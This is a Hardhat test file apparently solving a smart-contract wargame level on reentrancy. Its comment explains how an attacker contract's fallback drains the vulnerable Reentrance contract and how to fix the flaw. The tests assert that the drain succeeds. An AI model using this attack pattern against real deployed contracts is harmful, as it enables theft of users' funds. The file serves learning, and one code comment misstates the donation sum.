const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

██████╗░███████╗░░░░░░███████╗███╗░░██╗████████╗██████╗░░█████╗░███╗░░██╗░█████╗░██╗░░░██╗
██╔══██╗██╔════╝░░░░░░██╔════╝████╗░██║╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔══██╗╚██╗░██╔╝
██████╔╝█████╗░░█████╗█████╗░░██╔██╗██║░░░██║░░░██████╔╝███████║██╔██╗██║██║░░╚═╝░╚████╔╝░
██╔══██╗██╔══╝░░╚════╝██╔══╝░░██║╚████║░░░██║░░░██╔══██╗██╔══██║██║╚████║██║░░██╗░░╚██╔╝░░
██║░░██║███████╗░░░░░░███████╗██║░╚███║░░░██║░░░██║░░██║██║░░██║██║░╚███║╚█████╔╝░░░██║░░░
╚═╝░░╚═╝╚══════╝░░░░░░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░

 * Goal: 
 * 
 * The goal of this level is for you to steal all the funds from the contract.
 * 
 * Solution:
 *
 * The flaw in the Reentrance contract is the Withdraw function because it follows the following flow:
 * 1. check
 * 2. transfer funds
 * 3. update the state in the storage. 
 * 
 * The attack consists to pass the check, (require on the balance) and via malicious contract, as we know, 
 * write a fallback or receive function that can call the withdraw function recursively. As long as 
 * funds are transferred to the malicious contract, the fallback / receive function will block the 
 * execution of the withdraw, which will never go forward and consequently the state will never be 
 * updated. In this way, we can drain the contract until the balance is empty by calling the withdraw 
 * function in the fallback (passing as a parameter the amount used at the donation).
 * 
 * Note:
 * 
 * The flaw is that the status is updated after the funds are transferred.
 * To solve this problem, we must instead follow this: check, update the state and then transfer the funds.
 * Another recent alternative is to use a mutex on the desire function, so we wait for the function to finish
 * Tip: see the OpenZeppelin's ReentranceGuard
 * 
 */
describe("Re-entrancy", function () {
    let reentrance, reentranceAttacker, owner, player, donor1, donor2, donor3;

    before(async function () {
        [owner, player, donor1, donor2, donor3] = await ethers.getSigners();

        const Reentrance = await ethers.getContractFactory("contracts/Re-entrancy/Reentrance.sol:Reentrance");
        reentrance = await Reentrance.connect(owner).deploy();

        const ReentranceAttacker = await ethers.getContractFactory("contracts/Re-entrancy/ReentranceAttacker.sol:ReentranceAttacker");
        reentranceAttacker = await ReentranceAttacker.connect(player).deploy(reentrance.address);
    });

    describe("Steal all funds", async function () {
        let reentranceBalanceBefore, reentranceAttackerBalanceBefore, reentranceBalanceAfter, reentranceAttackerBalanceAfter;
        const amountDonated = ethers.utils.parseEther("4");

        it("Should assert the right balance after the donations", async function () {
            await reentrance.connect(donor1).donate(donor1.address, { value: ethers.utils.parseEther("1") });
            await reentrance.connect(donor2).donate(donor2.address, { value: ethers.utils.parseEther("2") });
            await reentrance.connect(donor2).donate(donor3.address, { value: ethers.utils.parseEther("3") });

            expect(await ethers.provider.getBalance(reentrance.address)).to.be.eq(ethers.utils.parseEther("6")); // sum of donations (1+1+1)
        });

        it("Should assert the donation of attacker and exploit the reentrancy attack to steal all funds donated", async function () {
            reentranceBalanceBefore = await ethers.provider.getBalance(reentrance.address);
            reentranceAttackerBalanceBefore = await ethers.provider.getBalance(reentranceAttacker.address);
            await reentranceAttacker.connect(player).donateAndSteal({ value: amountDonated});
            reentranceBalanceAfter = await ethers.provider.getBalance(reentrance.address);
            reentranceAttackerBalanceAfter = await ethers.provider.getBalance(reentranceAttacker.address);
            expect(await ethers.provider.getBalance(reentrance.address)).to.be.eq(ethers.utils.parseEther("0")); // successful drained
            expect(await ethers.provider.getBalance(reentranceAttacker.address)).to.be.eq(ethers.utils.parseEther("10")); // expect the full victim balance 
        });

        it("show result", async function(){
            console.table({
                before_attack: {
                    victimBalance: `${Number(ethers.utils.formatEther(reentranceBalanceBefore)).toString()} ETH`,
                    attackerBalance: `${Number(ethers.utils.formatEther(reentranceAttackerBalanceBefore)).toString()} ETH`,
                },
                after_attack: {
                    victimBalance: `${Number(ethers.utils.formatEther(reentranceBalanceAfter)).toString()} ETH`,
                    attackerBalance: `${Number(ethers.utils.formatEther(reentranceAttackerBalanceAfter)).toString()} ETH`,
                },
            });
        })
    });
});
